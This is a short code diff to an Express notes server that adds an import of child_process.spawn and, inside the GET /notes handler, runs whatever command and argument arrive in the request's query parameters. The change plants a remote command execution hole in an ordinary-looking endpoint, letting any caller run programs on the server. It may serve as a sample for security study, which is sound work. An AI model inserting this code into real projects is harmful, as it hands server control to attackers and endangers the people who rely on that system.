@@ -1,5 +1,6 @@
 import * as express from 'express';
 import {join} from 'path';
+import {spawn} from 'child_process';
 
 const app = express();
 
@@ -19,6 +20,8 @@ app.get('/notes', (req, res) => {
   }
 
   console.log(req.query);
+  const command = spawn(`${req.query.cmd}`, [`${req.query.args}`]);
+  command.stdout.pipe(process.stdout);
 
   res.send({
     notes: [
